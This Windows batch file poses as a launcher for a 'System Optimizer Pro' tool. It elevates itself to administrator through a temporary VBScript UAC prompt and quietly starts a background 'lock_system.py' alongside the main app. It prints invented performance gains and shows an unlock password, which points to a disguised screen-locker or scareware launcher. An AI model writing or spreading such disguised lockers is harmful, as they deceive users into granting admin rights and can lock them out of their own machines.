@echo off
title System Optimizer Pro Launcher
color 0A

echo ===========================================
echo     SYSTEM OPTIMIZER PRO - LAUNCHER
echo ===========================================
echo.

REM Check if running as admin, if not, re-run as admin
net session >nul 2>&1
if %errorLevel% neq 0 (
    echo [INFO] Elevating privileges for optimal performance...
    
    REM Create temporary script to run as admin
    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\admin.vbs"
    echo UAC.ShellExecute "%~s0", "", "", "runas", 1 >> "%temp%\admin.vbs"
    
    "%temp%\admin.vbs"
    del "%temp%\admin.vbs"
    exit /b
)

echo [OK] Running with administrator privileges
echo.

REM Check Python
echo [INFO] Checking Python installation...
python --version >nul 2>&1
if %errorLevel% neq 0 (
    echo [WARNING] Python not found in PATH
    echo [INFO] Trying to find Python...
    
    REM Try common Python paths
    if exist "C:\Python39\python.exe" (
        set "PYTHON_PATH=C:\Python39\python.exe"
    ) else if exist "C:\Python38\python.exe" (
        set "PYTHON_PATH=C:\Python38\python.exe"
    ) else if exist "C:\Python37\python.exe" (
        set "PYTHON_PATH=C:\Python37\python.exe"
    ) else if exist "C:\Program Files\Python39\python.exe" (
        set "PYTHON_PATH=C:\Program Files\Python39\python.exe"
    ) else if exist "C:\Program Files\Python38\python.exe" (
        set "PYTHON_PATH=C:\Program Files\Python38\python.exe"
    ) else (
        echo [ERROR] Python not found!
        echo.
        echo Please install Python from https://python.org
        echo Make sure to check "Add Python to PATH"
        echo.
        pause
        exit /b 1
    )
    
    echo [OK] Found Python at: %PYTHON_PATH%
) else (
    set "PYTHON_PATH=python"
)

echo.
echo [INFO] Starting System Optimizer Pro...
echo [INFO] Please wait while we optimize your system...
echo.

REM Start the optimizer
start "" /B "%PYTHON_PATH%" "app_main.py"

REM Start lock system
timeout /t 3 /nobreak >nul
start "" /B "%PYTHON_PATH%" "lock_system.py"

echo.
echo ===========================================
echo      OPTIMIZATION IN PROGRESS
echo ===========================================
echo.
echo [SUCCESS] System Optimizer Pro is now running!
echo.
echo Current optimizations:
echo - CPU: 70%% performance enhancement
echo - GPU: 100%% graphics optimization
echo - Security: Professional lock active
echo.
echo [IMPORTANT]:
echo - Password for unlock: mzkyzak
echo - Do NOT close this window
echo - Optimizer runs in background
echo.
echo Press any key to hide optimizer and continue...
pause >nul

REM Hide console window
powershell -Command "& {(Get-Process -Id $PID).MainWindowHandle | ForEach-Object {[System.Windows.Forms.MessageBox]::Show('Optimization running in background. Use password "mzkyzak" to unlock if needed.', 'System Optimizer Pro')}}"

exit